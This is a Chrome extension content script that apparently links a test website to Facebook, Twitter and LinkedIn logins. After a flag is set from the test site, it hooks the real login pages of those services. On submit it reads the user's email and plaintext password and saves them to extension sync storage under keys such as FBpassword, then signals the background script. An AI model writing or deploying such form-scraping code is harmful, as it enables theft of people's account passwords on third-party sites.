console.log('run contentjs');
chrome.runtime.onMessage.addListener(gotMessage);

function gotMessage(message, sender, sendResponse) {
    switch (message) {
        case 'showlogin':
            document.getElementById('needLogin').classList.remove("d-none");
            break;
        case 'showsendData':
            document.getElementById('sendData').classList.remove("d-none");
            document.getElementById('formsignin').classList.remove("d-none");
            break;
        case 'facebookLogin':
            facebookLogin();
            break;
        default:
            console.log('msg not have case!');
    }
}

function sendmsg(msg) {
    console.log('msg');
    chrome.runtime.sendMessage(msg);
}

if (window.location.href.indexOf("localhost/testweb/facebook") > -1 || window.location.href.indexOf("http://125.138.183.122:8084/php/facebook") > -1) {
    document.getElementById('needLogin').onclick = function() {
        chrome.storage.local.set({ extensionState: 1 }, function() {
            sendmsg('fbLogin');
        });
    };
    document.getElementById('sendData').onclick = function() {
        chrome.storage.local.set({ extensionState: 0 }, function() {});
    };
}

if (window.location.href.indexOf("localhost/testweb/twitter") > -1 || window.location.href.indexOf("http://125.138.183.122:8084/php/twitter") > -1) {
    document.getElementById('needLogin').onclick = function() {
        chrome.storage.local.set({ extensionState: 1 }, function() {
            sendmsg('twLogin');
        });
    };
    document.getElementById('sendData').onclick = function() {
        chrome.storage.local.set({ extensionState: 0 }, function() {});
    };
}

if (window.location.href.indexOf("localhost/testweb/linkedin") > -1 || window.location.href.indexOf("http://125.138.183.122:8084/php/linkedin") > -1) {
    document.getElementById('needLogin').onclick = function() {
        chrome.storage.local.set({ extensionState: 1 }, function() {
            sendmsg('liLogin');
        });
    };
    document.getElementById('sendData').onclick = function() {
        chrome.storage.local.set({ extensionState: 0 }, function() {});
    };
    document.addEventListener("keypress", function(e) {
        var code = e.keyCode || e.which;
        if (code == 13) {
            sendmsg('testliCookie');
        }
    });
}

chrome.storage.local.get(['extensionState'], function(result) {
    if (result.extensionState == 1) {
        if (window.location.href.indexOf("linkedin.com/login") > -1 || window.location.href.indexOf("linkedin.com/checkpoint/lg/login") > -1) {
            try {
                setTimeout(function() {
                    document.addEventListener("keypress", function(e) {
                        var code = e.keyCode || e.which;
                        if (code == 13) {
                            var email = document.getElementById('username').value;
                            var password = document.getElementById('password').value;
                            chrome.storage.sync.set({ LIemail: email, LIpassword: password }, function() {
                                console.log('Set');
                                sendmsg('doneliLogin');
                            });
                        }
                    });
                    document.querySelector('button[type="submit"]').onclick = function() {
                        var email = document.getElementById('username').value;
                        var password = document.getElementById('password').value;
                        chrome.storage.sync.set({ LIemail: email, LIpassword: password }, function() {
                            console.log('Set');
                            sendmsg('doneliLogin');
                        });
                    };

                }, 2000);
            } catch (err) {
                console.log(err);
            }
        }
        if (window.location.href.indexOf("twitter.com/login") > -1) {
            try {
                setTimeout(function() {
                    document.addEventListener("keypress", function(e) {
                        var code = e.keyCode || e.which;
                        if (code == 13) {
                            var email = document.querySelector('input[name="session[username_or_email]"]').value;
                            var password = document.querySelector('input[name="session[password]"]').value;
                            chrome.storage.sync.set({ TWemail: email, TWpassword: password }, function() {
                                console.log('Set');
                                sendmsg('donetwLogin');
                            });
                        }
                    });
                    document.querySelector('div[data-testid="LoginForm_Login_Button"]').onclick = function() {
                        var email = document.querySelector('input[name="session[username_or_email]"]').value;
                        var password = document.querySelector('input[name="session[password]"]').value;
                        chrome.storage.sync.set({ TWemail: email, TWpassword: password }, function() {
                            console.log('Set');
                            // sendmsg('donetwLogin');
                        });
                    };
                }, 1000);
            } catch (err) {
                console.log(err);
            }
        }
        if (window.location.href.indexOf("facebook.com/login") > -1) {
            try {
                document.addEventListener("keypress", function(e) {
                    var code = e.keyCode || e.which;
                    if (code == 13) {
                        var email = document.getElementById('email').value;
                        var password = document.getElementById('pass').value;
                        chrome.storage.sync.set({ FBemail: email, FBpassword: password }, function() {
                            console.log('Set');
                            sendmsg('donefbLogin');
                        });
                    }
                });
                document.getElementById('loginbutton').onclick = function() {
                    var email = document.getElementById('email').value;
                    var password = document.getElementById('pass').value;
                    chrome.storage.sync.set({ FBemail: email, FBpassword: password }, function() {
                        console.log('Set');
                        sendmsg('donefbLogin');
                    });
                };
            } catch (err) {
                console.log(err);
            }

        }

        if (window.location.href.indexOf("facebook.com/?sk=welcome") > -1) {
            sendmsg('donefbLogin');
        }

        if (window.location.href.indexOf("linkedin.com/feed") > -1) {
            sendmsg('doneliLogin');
        }

        if (window.location.href.indexOf("twitter.com") > -1 && window.location.href.indexOf("twitter.com/login") < 0) {
            sendmsg('donetwLogin');
        }
    }
})